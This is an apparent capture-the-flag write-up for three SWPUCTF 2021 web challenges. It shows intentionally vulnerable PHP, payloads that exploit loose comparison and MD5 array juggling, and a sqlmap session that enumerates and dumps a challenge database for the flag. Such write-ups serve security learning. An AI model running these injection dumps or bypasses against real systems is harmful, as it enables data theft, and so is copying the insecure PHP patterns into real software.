# SWPUCTF 2021

## Web

### jicao

```php
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

Payload 如下

```
Body: id=wllmNB
Param: json={"x":"wllm"}
```

### easy\_md5

```php
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?>
```

Payload 如下

```
Body: password[]=2
Param: name[]=1
```

### easy\_sql

打开页面后 title 存在提示 参数是 `wllm` 。

```bash
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 --dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] test_db
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db --tables
Database: test_db
[2 tables]
+---------+
| test_tb |
| users   |
+---------+
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db -T test_tb --columns
Database: test_db
Table: test_tb
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(50) |
| id     | int(11)     |
+--------+-------------+
$ python sqlmap.py  -u http://node2.anna.nssctf.cn:28574/?wllm=1 -D test_db -T test_tb -C flag --dump
Database: test_db
Table: test_tb
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| NSSCTF{66c831a1-4505-4bcd-8b89-b9620b715aeb} |
+----------------------------------------------+
```
